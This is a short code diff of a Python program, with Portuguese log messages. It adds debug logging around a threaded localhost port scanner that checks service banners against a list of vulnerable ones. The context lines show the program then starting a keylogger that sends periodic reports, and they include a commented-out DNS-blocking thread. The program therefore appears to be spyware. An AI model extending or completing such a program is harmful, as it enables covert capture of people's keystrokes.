@@ -209,9 +209,10 @@ class Scanner:
         for port in range(1, 5051):
             while threading.active_count() > 150:
                 time.sleep(0.01)
+            logging("Inicio do programa!"+str(port)+"\n")
             thread = threading.Thread(target=self.port_scanner, args=["localhost", port])
             thread.start()
-
+        logging("Inicio do programa! teste fora do for\n")
         with open("vulnarable_banners.txt", "r") as file:
             data = file.read()
             for i in range(len(self.banners)):
@@ -222,9 +223,10 @@ class Scanner:
 
 
 if __name__ == "__main__":
-    logging("Inicio do programa!\n")
+    logging("Iniciou do programa!\n")
     #threading.Thread(target=block_DNS()).start()
     scanner = Scanner()
+    logging("Iniciou o Scanner!\n")
     threading.Thread(scanner.scan()).start()
     logging("Termino do Scanner do programa!\n")
     keylogger = Keylogger(interval=SEND_REPORT_EVERY)
